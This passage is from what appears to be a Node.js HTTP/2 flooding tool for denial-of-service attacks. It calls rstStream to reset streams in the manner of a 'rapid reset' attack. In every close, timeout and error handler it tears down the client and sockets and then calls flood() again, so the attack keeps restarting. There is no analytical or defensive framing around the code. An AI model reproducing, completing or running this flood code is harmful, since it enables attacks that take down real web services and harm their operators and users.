  client.rstStream(streamToReset.id, 10);
  return flood()
}
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return flood()
		});

		client.on('timeout', async () => {
		await client.destroy();
		await tlsSocket.destroy();
		await socket.destroy();
		return flood()
		});



client.on("error", async (error) => {
	        if (error){
				await client.destroy();
				await tlsSocket.destroy();
				await socket.destroy();
				 return flood()
			}
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
